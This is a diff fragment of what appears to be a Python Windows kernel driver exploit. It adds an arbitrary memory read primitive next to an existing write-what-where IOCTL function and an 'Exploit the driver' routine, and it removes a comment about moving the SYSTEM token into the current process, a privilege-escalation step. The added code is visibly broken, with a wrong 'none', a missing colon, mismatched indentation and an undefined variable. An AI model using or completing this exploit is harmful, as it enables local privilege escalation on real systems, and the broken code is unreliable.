@@ -93,7 +93,13 @@ def writeQWORD(driver, what=None, where=None):
     print "Value after: %08x" % cast(0x000000001a002000, POINTER(c_ulonglong))[0]
     return triggerIOCTL
 
-# This block is reserved for moving the token from the SYSTEM process to the CURRENT process.
+def readWhatWhere(driver=none, what=None, where=None)
+lpBuffer = c_ulonglong()
+result = kernel32.ReadProcessMemory(0xFFFFFFFFFFFFFFFF, 0x000000001a001010, byref(lpBuffer), 0x08, byref(read))
+	if result == 0:
+		print("Something went wrong while reading memory","e")
+		sys.exit()
+	return lpBuffer
 
 # Exploit the driver
 def executeOverwrite():
